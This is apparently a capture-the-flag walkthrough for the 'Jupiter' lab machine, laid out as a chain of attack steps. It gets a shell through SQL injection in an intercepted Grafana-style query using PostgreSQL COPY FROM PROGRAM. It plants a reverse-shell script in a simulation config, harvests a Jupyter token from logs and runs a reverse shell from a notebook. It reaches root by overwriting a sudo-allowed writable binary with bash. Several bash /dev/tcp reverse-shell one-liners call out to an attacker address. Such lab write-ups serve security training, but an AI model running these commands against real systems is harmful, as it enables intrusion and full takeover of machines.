find the subdomain: `kiosk.jupiter.htb`
intercept the post request to `/api/ds/query`
change `rawSql` to ```"CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.<ip>/4444 0>&1\"'"; to get a reverse shell.```

find `network-simulation.yml` at `/dev/shm`
create a file at /dev/shm/reverse.sh
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.<ip>/4444 0>&1"
```
`chmod 777 reverse.sh`
change client>proceses>path in `network-simulation.yml` to `/dev/shm/reverse.sh` get rid of the args to get juno.

do `id` to find out juno in `science` group which gives access to `/opt/solar-flares/`. do `grep -rie token` in `/opt/solar-flares/logs/` to find the right token of jupyter in the logs based on date.
redirect port 8888 and access jupyter web interface with the provided token.
open `flares.ipynb` in jupyter web interface which allows running python code.

Run
```python
import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.<ip>/4444 0>&1"');
```
to get shell as jovian.

do `sudo -ll` to see jovian can run `/usr/local/bin/sattrack` as root.

doing `ls -l /usr/local/bin/sattrack` reveal jovian can write to the file.

do
```bash
cp /bin/bash /usr/local/bin/sattrack
sudo /usr/local/bin/sattrack
```

to get root shell.

